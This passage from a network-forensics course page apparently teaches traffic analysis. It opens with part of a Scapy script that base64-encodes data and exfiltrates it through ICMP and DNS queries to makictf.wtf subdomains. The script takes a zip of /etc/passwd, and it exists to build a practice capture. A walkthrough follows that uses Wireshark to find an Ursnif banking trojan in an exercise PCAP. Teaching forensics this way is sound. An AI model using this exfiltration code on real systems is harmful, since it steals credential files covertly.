</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=n>list_split</span><span class=p>[</span><span class=n>i</span><span class=p>])</span>
</span></span><span class=line><span class=cl>        <span class=n>send</span><span class=p>(</span><span class=n>IP</span><span class=p>(</span><span class=n>dst</span><span class=o>=</span><span class=n>destIP</span><span class=p>)</span><span class=o>/</span><span class=n>ICMP</span><span class=p>()</span><span class=o>/</span><span class=n>list_split</span><span class=p>[</span><span class=n>i</span><span class=p>])</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=s1>&#39;&#39;&#39;
</span></span></span><span class=line><span class=cl><span class=s1>Exfiltration with DNS A requests. Send an archive / file or wathever
</span></span></span><span class=line><span class=cl><span class=s1>splitted into 20 char / packet.
</span></span></span><span class=line><span class=cl><span class=s1>Don&#39;t forget to put a responder server on the target. 
</span></span></span><span class=line><span class=cl><span class=s1>Responder will up a DNS server that accept all requests, even wrong one.
</span></span></span><span class=line><span class=cl><span class=s1>
</span></span></span><span class=line><span class=cl><span class=s1>@param mesg: Input to send via DNS A requests - C</span><span class=si>{bytes}</span><span class=s1>
</span></span></span><span class=line><span class=cl><span class=s1>@return: No return, sends packets.
</span></span></span><span class=line><span class=cl><span class=s1>&#39;&#39;&#39;</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>dns_exf</span><span class=p>(</span><span class=n>mesg</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>mesg</span> <span class=o>=</span> <span class=n>base64</span><span class=o>.</span><span class=n>b64encode</span><span class=p>(</span><span class=n>mesg</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>n</span> <span class=o>=</span> <span class=mi>20</span>
</span></span><span class=line><span class=cl>    <span class=n>list_split</span> <span class=o>=</span> <span class=p>[</span><span class=n>mesg</span><span class=p>[</span><span class=n>i</span><span class=p>:</span><span class=n>i</span><span class=o>+</span><span class=n>n</span><span class=p>]</span> <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=nb>len</span><span class=p>(</span><span class=n>mesg</span><span class=p>),</span> <span class=n>n</span><span class=p>)]</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=nb>len</span><span class=p>(</span><span class=n>list_split</span><span class=p>)):</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=nb>str</span><span class=p>(</span><span class=n>list_split</span><span class=p>[</span><span class=n>i</span><span class=p>])[</span><span class=mi>2</span><span class=p>:</span><span class=o>-</span><span class=mi>1</span><span class=p>])</span>
</span></span><span class=line><span class=cl>        <span class=n>part</span> <span class=o>=</span> <span class=p>(</span><span class=s2>&#34;</span><span class=si>%s</span><span class=s2>.makictf.wtf&#34;</span> <span class=o>%</span> <span class=nb>str</span><span class=p>(</span><span class=n>list_split</span><span class=p>[</span><span class=n>i</span><span class=p>])[</span><span class=mi>2</span><span class=p>:</span><span class=o>-</span><span class=mi>1</span><span class=p>])</span>
</span></span><span class=line><span class=cl>        <span class=n>sr1</span><span class=p>(</span><span class=n>IP</span><span class=p>(</span><span class=n>dst</span><span class=o>=</span><span class=n>destIP</span><span class=p>)</span><span class=o>/</span><span class=n>UDP</span><span class=p>(</span><span class=n>dport</span><span class=o>=</span><span class=mi>53</span><span class=p>)</span><span class=o>/</span><span class=n>DNS</span><span class=p>(</span><span class=n>rd</span><span class=o>=</span><span class=mi>1</span><span class=p>,</span><span class=n>qd</span><span class=o>=</span><span class=n>DNSQR</span><span class=p>(</span><span class=n>qname</span><span class=o>=</span><span class=n>part</span><span class=p>)),</span><span class=n>verbose</span><span class=o>=</span><span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=vm>__name__</span> <span class=o>==</span> <span class=s2>&#34;__main__&#34;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>key_archive</span> <span class=o>=</span> <span class=s2>&#34;The key of the encrypted archive is: CyberMoocMooc&#34;</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=n>f</span> <span class=o>=</span> <span class=nb>open</span><span class=p>(</span><span class=s1>&#39;passwd.zip&#39;</span><span class=p>,</span><span class=s1>&#39;rb&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>enc_archive</span> <span class=o>=</span> <span class=n>f</span><span class=o>.</span><span class=n>read</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=n>f</span><span class=o>.</span><span class=n>close</span><span class=p>()</span>
</span></span><span class=line><span class=cl>   
</span></span><span class=line><span class=cl>    <span class=n>ping_exf</span><span class=p>(</span><span class=n>key_archive</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>dns_exf</span><span class=p>(</span><span class=n>enc_archive</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><p>This script will convert a file to base64, then send it to fictitious subdomains. Just before, a string in hex is sent by ICMP. As part of our TP, I propose you to make an encrypted zip archive and send it by DNS, the key would be sent by ICMP.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ zip -e passwd.zip /etc/passwd
</span></span><span class=line><span class=cl>Enter password: <span class=o>[</span>Enter your password<span class=o>]</span>
</span></span></code></pre></td></tr></table></div></div><p>It is now time to run Wireshark and the exfil_gen.py script. When the script is completed, then we can stop Wireshark capture and save the traffic into a PCAP file.</p><h2 id=trojan-horse>Trojan horse</h2><p>In this practical exercise, it will not be a CTF challenge task. It will be a real forensic case, with a real bad malware inside it. <strong>Then be careful with this PCAP, it contains a banking trojan</strong>.</p><h3 id=statement-3>Statement</h3><p>The PCAP file can be download here:</p><table><thead><tr><th>Filename</th><th>Hash</th><th>Download link</th></tr></thead><tbody><tr><td>2018-11-13-traffic-analysis-exercise.pcap</td><td>221168dc0865c145fe977b2c373022f3</td><td><a href=https://tinyurl.com/TP-malicious target=_blank rel="noopener noreffer">https://tinyurl.com/TP-malicious</a></td></tr></tbody></table><p>This practical exercise comes from: <a href=https://www.malware-traffic-analysis.net/2018/11/13/index.html target=_blank rel="noopener noreffer">https://www.malware-traffic-analysis.net/2018/11/13/index.html</a></p><p>And here is the questions to answer:</p><ul><li>What was the date and time the malicious traffic started?</li><li>What is the MAC address of the infected Windows host?</li><li>What is the host name of the infected Windows host?</li><li>What is the user account name used on the infected Windows host?</li><li>What URL in the pcap returned a Windows executable file?</li><li>What is the size of the Windows executable file from that URL?</li><li>What is the SHA256 hash of the Windows executable file from that URL?</li><li>What type of malware is the Windows executable returned from that URL?</li></ul><h3 id=resolution-3>Resolution</h3><p>You can find the official correction here, the password of the archive is &ldquo;<strong>infected</strong>&rdquo; : <a href=https://www.malware-traffic-analysis.net/2018/11/13/2018-11-13-traffic-analysis-exercise-answers.pdf.zip target=_blank rel="noopener noreffer">https://www.malware-traffic-analysis.net/2018/11/13/2018-11-13-traffic-analysis-exercise-answers.pdf.zip</a></p><h4 id=what-url-in-the-pcap-returned-a-windows-executable-file>What URL in the pcap returned a Windows executable file?</h4><p>I didn&rsquo;t do as the original author. I tried to find the malware first. I just did a research with &ldquo;data.data&rdquo; filter:</p><p><img class=lazyload src=/maki.bzh/svg/loading.min.svg data-src=https://i.imgur.com/rkmPE4c.png data-srcset="https://i.imgur.com/rkmPE4c.png, https://i.imgur.com/rkmPE4c.png 1.5x, https://i.imgur.com/rkmPE4c.png 2x" data-sizes=auto alt=https://i.imgur.com/rkmPE4c.png title=https://i.imgur.com/rkmPE4c.png></p><p>As you can see in the red frame, there is a magic number. This magic number is for a PE file, or a Windows executable (portable executable).</p><p>If your &ldquo;data.text&rdquo; column is blank, you should modify your Wireshark preferences for &ldquo;data&rdquo; protocol:</p><p><img class=lazyload src=/maki.bzh/svg/loading.min.svg data-src=https://i.imgur.com/QmQxT1M.gif data-srcset="https://i.imgur.com/QmQxT1M.gif, https://i.imgur.com/QmQxT1M.gif 1.5x, https://i.imgur.com/QmQxT1M.gif 2x" data-sizes=auto alt=https://i.imgur.com/QmQxT1M.gif title=https://i.imgur.com/QmQxT1M.gif></p><p>According to the signature list on Wikipedia (cf. Resource 1):</p><p><img class=lazyload src=/maki.bzh/svg/loading.min.svg data-src=https://i.imgur.com/i4SFNu7.png data-srcset="https://i.imgur.com/i4SFNu7.png, https://i.imgur.com/i4SFNu7.png 1.5x, https://i.imgur.com/i4SFNu7.png 2x" data-sizes=auto alt=https://i.imgur.com/i4SFNu7.png title=https://i.imgur.com/i4SFNu7.png></p><p>Donc, nous avons bien un executable Windows. Surement notre malware. À ce stade, il est possible de répondre à la question &ldquo;What URL in the pcap returned a Windows executable file&rdquo;:</p><p><img class=lazyload src=/maki.bzh/svg/loading.min.svg data-src=https://i.imgur.com/Ug1yPC0.gif data-srcset="https://i.imgur.com/Ug1yPC0.gif, https://i.imgur.com/Ug1yPC0.gif 1.5x, https://i.imgur.com/Ug1yPC0.gif 2x" data-sizes=auto alt=https://i.imgur.com/Ug1yPC0.gif title=https://i.imgur.com/Ug1yPC0.gif></p><p>Then:</p><blockquote><p>hxxp://shumbildac[.]com/WES/fatog.php?l=ngul5.xap</p></blockquote><h4 id=what-is-the-size-of-the-windows-executable-file-from-that-url>What is the size of the Windows executable file from that URL?</h4><p>Now I have to extract the PE file. You can do it with wireshark, or tshark:</p><p><img class=lazyload src=/maki.bzh/svg/loading.min.svg data-src=https://i.imgur.com/0uBbNN9.gif data-srcset="https://i.imgur.com/0uBbNN9.gif, https://i.imgur.com/0uBbNN9.gif 1.5x, https://i.imgur.com/0uBbNN9.gif 2x" data-sizes=auto alt=https://i.imgur.com/0uBbNN9.gif title=https://i.imgur.com/0uBbNN9.gif></p><p><img class=lazyload src=/maki.bzh/svg/loading.min.svg data-src=https://i.imgur.com/tfxL8Wl.gif data-srcset="https://i.imgur.com/tfxL8Wl.gif, https://i.imgur.com/tfxL8Wl.gif 1.5x, https://i.imgur.com/tfxL8Wl.gif 2x" data-sizes=auto alt=https://i.imgur.com/tfxL8Wl.gif title=https://i.imgur.com/tfxL8Wl.gif></p><p>Then finding the size is quite easy now:</p><p><img class=lazyload src=/maki.bzh/svg/loading.min.svg data-src=https://i.imgur.com/GlFMqni.png data-srcset="https://i.imgur.com/GlFMqni.png, https://i.imgur.com/GlFMqni.png 1.5x, https://i.imgur.com/GlFMqni.png 2x" data-sizes=auto alt=https://i.imgur.com/GlFMqni.png title=https://i.imgur.com/GlFMqni.png></p><h4 id=what-is-the-sha256-hash-of-the-windows-executable-file-from-that-url>What is the SHA256 hash of the Windows executable file from that URL?</h4><p>As above, it&rsquo;s will be easy to find the hash:</p><p><img class=lazyload src=/maki.bzh/svg/loading.min.svg data-src=https://i.imgur.com/8Xz2Vzw.png data-srcset="https://i.imgur.com/8Xz2Vzw.png, https://i.imgur.com/8Xz2Vzw.png 1.5x, https://i.imgur.com/8Xz2Vzw.png 2x" data-sizes=auto alt=https://i.imgur.com/8Xz2Vzw.png title=https://i.imgur.com/8Xz2Vzw.png></p><blockquote><p>97f149f146b0ec63c32abff204ae27638f0310536172b0f718f1a91a5672fe71</p></blockquote><h4 id=what-type-of-malware-is-the-windows-executable-returned-from-that-url>What type of malware is the Windows executable returned from that URL?</h4><p>We can check our file on VirusTotal.com. No need to upload the file, if it&rsquo;s a well known malware, the hash is enough:</p><p><img class=lazyload src=/maki.bzh/svg/loading.min.svg data-src=https://i.imgur.com/jAdnI8N.gif data-srcset="https://i.imgur.com/jAdnI8N.gif, https://i.imgur.com/jAdnI8N.gif 1.5x, https://i.imgur.com/jAdnI8N.gif 2x" data-sizes=auto alt=https://i.imgur.com/jAdnI8N.gif title=https://i.imgur.com/jAdnI8N.gif></p><p>It looks to be &ldquo;Ursnif&rdquo; banking malware, don&rsquo;t run it on you Windows host!</p><h4 id=what-was-the-date-and-time-the-malicious-traffic-started>What was the date and time the malicious traffic started?</h4><p>Now that we found the malware, we can assume the date and time of the malicious traffic:</p><p><img class=lazyload src=/maki.bzh/svg/loading.min.svg data-src=https://i.imgur.com/bETDt1d.png data-srcset="https://i.imgur.com/bETDt1d.png, https://i.imgur.com/bETDt1d.png 1.5x, https://i.imgur.com/bETDt1d.png 2x" data-sizes=auto alt=https://i.imgur.com/bETDt1d.png title=https://i.imgur.com/bETDt1d.png></p><blockquote><p>At 2018/11/07 around 20:47</p></blockquote><h4 id=what-is-the-mac-address-of-the-infected-windows-host>What is the MAC address of the infected Windows host?</h4><p>We can see the destination IP on the above screen: <strong>10.22.15.119</strong>. It should be our infected Windows host. So the mac address is:</p><p><img class=lazyload src=/maki.bzh/svg/loading.min.svg data-src=https://i.imgur.com/AuSZ3Uy.png data-srcset="https://i.imgur.com/AuSZ3Uy.png, https://i.imgur.com/AuSZ3Uy.png 1.5x, https://i.imgur.com/AuSZ3Uy.png 2x" data-sizes=auto alt=https://i.imgur.com/AuSZ3Uy.png title=https://i.imgur.com/AuSZ3Uy.png></p><blockquote><p>00:11:2f:d1:6e:52</p></blockquote><h4 id=what-is-the-host-name-of-the-infected-windows-host>What is the host name of the infected Windows host?</h4><p>To find a Windows hostname, I can filter on the IP and the DHCP protocol (<strong>bootp</strong> in Wireshark):</p><p><img class=lazyload src=/maki.bzh/svg/loading.min.svg data-src=https://i.imgur.com/BxRbGKd.png data-srcset="https://i.imgur.com/BxRbGKd.png, https://i.imgur.com/BxRbGKd.png 1.5x, https://i.imgur.com/BxRbGKd.png 2x" data-sizes=auto alt=https://i.imgur.com/BxRbGKd.png title=https://i.imgur.com/BxRbGKd.png></p><p>Then, the hostname is:</p><blockquote><p>Danger-Win-PC</p></blockquote><h4 id=what-is-the-user-account-name-used-on-the-infected-windows-host>What is the user account name used on the infected Windows host?</h4><p>Ok, it&rsquo;s a Windows, we can guess some Kerberos traffic:</p><p><img class=lazyload src=/maki.bzh/svg/loading.min.svg data-src=https://i.imgur.com/rlg0i4c.png data-srcset="https://i.imgur.com/rlg0i4c.png, https://i.imgur.com/rlg0i4c.png 1.5x, https://i.imgur.com/rlg0i4c.png 2x" data-sizes=auto alt=https://i.imgur.com/rlg0i4c.png title=https://i.imgur.com/rlg0i4c.png></p><p>Now, you can add a new column:</p><p><img class=lazyload src=/maki.bzh/svg/loading.min.svg data-src=https://i.imgur.com/RaazFrU.gif data-srcset="https://i.imgur.com/RaazFrU.gif, https://i.imgur.com/RaazFrU.gif 1.5x, https://i.imgur.com/RaazFrU.gif 2x" data-sizes=auto alt=https://i.imgur.com/RaazFrU.gif title=https://i.imgur.com/RaazFrU.gif></p><blockquote><p>carlos.danger</p></blockquote><p>And now we answered to all the questions! :D</p><h2 id=ressources>Ressources</h2><ol><li>Wireshark team, We&rsquo;re switching to Qt, October 2013, Wireshark blog: <a href=https://blog.wireshark.org/2013/10/switching-to-qt/ target=_blank rel="noopener noreffer">https://blog.wireshark.org/2013/10/switching-to-qt/</a></li><li>Wireshark team, Man page tshark, Wireshark documentations: <a href=https://www.wireshark.org/docs/man-pages/tshark.html target=_blank rel="noopener noreffer">https://www.wireshark.org/docs/man-pages/tshark.html</a></li><li>Maki, OtterCTF 2018, 24 December, Maki blog: <a href=https://maki.bzh/courses/blog/writeups/otterctf2018/#otter-leak target=_blank rel="noopener noreffer">https://maki.bzh/courses/blog/writeups/otterctf2018/#otter-leak</a></li><li>diceone, diceone/capanalysis docker, 2016, Docker Hub: <a href=https://hub.docker.com/r/diceone/capanalysis/ target=_blank rel="noopener noreffer">https://hub.docker.com/r/diceone/capanalysis/</a></li><li>CapAnalysis team, PCAP of another point of view, CapAnalysis official website: <a href=https://www.capanalysis.net/ca/ target=_blank rel="noopener noreffer">https://www.capanalysis.net/ca/</a></li><li>ReFirmLabs, Binwalk, 2018, Official GitHub: <a href=https://github.com/ReFirmLabs/binwalk target=_blank rel="noopener noreffer">https://github.com/ReFirmLabs/binwalk</a></li><li>korczis, Foremost, 2016, Official GitHub: <a href=https://github.com/korczis/foremost target=_blank rel="noopener noreffer">https://github.com/korczis/foremost</a></li><li>PyShark, PyShark, Python packet parser using wireshark&rsquo;s tshark, Official GitHub: <a href=https://kiminewt.github.io/pyshark/ target=_blank rel="noopener noreffer">https://kiminewt.github.io/pyshark/</a></li><li>Scapy team, Scapy project, Official website: <a href=https://scapy.net/ target=_blank rel="noopener noreffer">https://scapy.net/</a></li><li>Linux-France team, grep man page, Linux-France: <a href=http://www.linux-france.org/article/man-fr/man1/grep-1.html target=_blank rel="noopener noreffer">http://www.linux-france.org/article/man-fr/man1/grep-1.html</a></li><li>Die team, strings man page, die website: <a href=https://linux.die.net/man/1/strings target=_blank rel="noopener noreffer">https://linux.die.net/man/1/strings</a></li><li>Linuxcommand team, tr man page, linuxcommand: <a href=http://linuxcommand.org/lc3_man_pages/tr1.html target=_blank rel="noopener noreffer">http://linuxcommand.org/lc3_man_pages/tr1.html</a></li><li>Systutorials team, xxd man page, systutorials: <a href=https://www.systutorials.com/docs/linux/man/1-xxd/ target=_blank rel="noopener noreffer">https://www.systutorials.com/docs/linux/man/1-xxd/</a></li><li>Wikipedia, ISO 8601, Wikipedia: <a href=https://fr.wikipedia.org/wiki/ISO_8601 target=_blank rel="noopener noreffer">https://fr.wikipedia.org/wiki/ISO_8601</a></li><li>cURL, curl.1 the man page, haxx.se: <a href=https://curl.haxx.se/docs/manpage.html target=_blank rel="noopener noreffer">https://curl.haxx.se/docs/manpage.html</a></li><li>Nico, Netcat parce que c&rsquo;est trop fast0ch&rsquo;, 20 December 2009, Les tutos de Nico: <a href=http://www.lestutosdenico.com/tutos-de-nico/netcat target=_blank rel="noopener noreffer">http://www.lestutosdenico.com/tutos-de-nico/netcat</a></li><li>Pentester Academy, Learn pentesting online, pentesteracademy.com: <a href=https://www.pentesteracademy.com/ target=_blank rel="noopener noreffer">https://www.pentesteracademy.com/</a></li><li>pentesteracademy, PA Toolkit (Pentester Academy Wireshark Toolkit), 2018, Official GitHub: <a href=https://github.com/pentesteracademy/patoolkit target=_blank rel="noopener noreffer">https://github.com/pentesteracademy/patoolkit</a></li><li>Wikipedia, Indicator of compromise, Wikipedia: <a href=https://en.wikipedia.org/wiki/Indicator_of_compromise target=_blank rel="noopener noreffer">https://en.wikipedia.org/wiki/Indicator_of_compromise</a></li><li>Wireshark team, Display filter in Wireshark, Official Wireshark wiki: <a href=https://wiki.wireshark.org/DisplayFilters target=_blank rel="noopener noreffer">https://wiki.wireshark.org/DisplayFilters</a></li><li>Wikipedia, Base64, Wikipedia: <a href=https://en.wikipedia.org/wiki/Base64 target=_blank rel="noopener noreffer">https://en.wikipedia.org/wiki/Base64</a></li><li>Wireshark team, Man page tshark, Wireshark documentations: <a href=https://www.wireshark.org/docs/man-pages/tshark.html target=_blank rel="noopener noreffer">https://www.wireshark.org/docs/man-pages/tshark.html</a></li><li>Linuxcommand team, tr man page, linuxcommand: <a href=http://linuxcommand.org/lc3_man_pages/tr1.html target=_blank rel="noopener noreffer">http://linuxcommand.org/lc3_man_pages/tr1.html</a></li><li>Systutorials team, xxd man page, systutorials: <a href=https://www.systutorials.com/docs/linux/man/1-xxd/ target=_blank rel="noopener noreffer">https://www.systutorials.com/docs/linux/man/1-xxd/</a></li><li>Man team, rev(1) Linux man page, man7: <a href=http://man7.org/linux/man-pages/man1/rev.1.html target=_blank rel="noopener noreffer">http://man7.org/linux/man-pages/man1/rev.1.html</a></li><li>Die team, base64(1) man page, die: <a href=https://linux.die.net/man/1/base64 target=_blank rel="noopener noreffer">https://linux.die.net/man/1/base64</a></li><li>SpiderLabs, Responder, 2017, GitHub: <a href=https://github.com/SpiderLabs/Responder target=_blank rel="noopener noreffer">https://github.com/SpiderLabs/Responder</a></li><li>Python crew, python docker, DockerHub: <a href=https://hub.docker.com/_/python/ target=_blank rel="noopener noreffer">https://hub.docker.com/_/python/</a></li><li>VirusTotal, Analyze malicious file, VirusTotal: <a href=https://www.virustotal.com/ target=_blank rel="noopener noreffer">https://www.virustotal.com/</a></li><li>admin, Ursnif reloaded: tracing the latest trojan campaigns, 19/11/18, reaqta.com: <a href=https://reaqta.com/2018/11/ursnif-reloaded-tracing-latest-campaigns/ target=_blank rel="noopener noreffer">https://reaqta.com/2018/11/ursnif-reloaded-tracing-latest-campaigns/</a></li><li>Wireshark team, Dynamic Host Configuration Protocol (DHCP), Wireshark official blog: <a href=https://wiki.wireshark.org/DHCP target=_blank rel="noopener noreffer">https://wiki.wireshark.org/DHCP</a></li></ol></div></div></div></main><footer class=footer><div class=footer-container><div class=footer-line>Powered by <a href=https://gohugo.io/ target=_blank rel="noopener noreffer" title="Hugo 0.100.2">Hugo</a> | Theme - <a href=https://github.com/dillonzq/LoveIt target=_blank rel="noopener noreffer" title="LoveIt 0.2.11"><i class="far fa-kiss-wink-heart fa-fw" aria-hidden=true></i> LoveIt</a></div><div class=footer-line itemscope itemtype=http://schema.org/CreativeWork><i class="far fa-copyright fa-fw" aria-hidden=true></i><span itemprop=copyrightYear>2017 - 2023</span><span class=author itemprop=copyrightHolder>&nbsp;<a href=maki.bzh/ target=_blank>Maki - Alan Marrec</a></span>&nbsp;|&nbsp;<span class=license><a rel="license external nofollow noopener noreffer" href=https://creativecommons.org/licenses/by-nc/4.0/ target=_blank>CC BY-NC 4.0</a></span></div></div></footer></div><div id=fixed-buttons><a href=# id=back-to-top class=fixed-button title="Back to Top"><i class="fas fa-arrow-up fa-fw" aria-hidden=true></i>
</a><a href=# id=view-comments class=fixed-button title="View Comments"><i class="fas fa-comment fa-fw" aria-hidden=true></i></a></div><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/lightgallery@2.5.0/css/lightgallery-bundle.min.css><script type=text/javascript src=https://cdn.jsdelivr.net/npm/lazysizes@5.3.2/lazysizes.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/lightgallery@2.5.0/lightgallery.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/lightgallery@2.5.0/plugins/thumbnail/lg-thumbnail.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/lightgallery@2.5.0/plugins/zoom/lg-zoom.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/clipboard@2.0.11/dist/clipboard.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/sharer.js@0.5.1/sharer.min.js></script><script type=text/javascript>window.config={code:{copyTitle:"Copy to clipboard",maxShownLines:50},comment:{},lightgallery:!0}</script><script type=text/javascript src=/maki.bzh/js/theme.min.js></script><script type=text/javascript>window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag('js',new Date),gtag('config','G-WVPYCS7SPM',{anonymize_ip:!0})</script><script type=text/javascript src="https://www.googletagmanager.com/gtag/js?id=G-WVPYCS7SPM" async></script></body></html>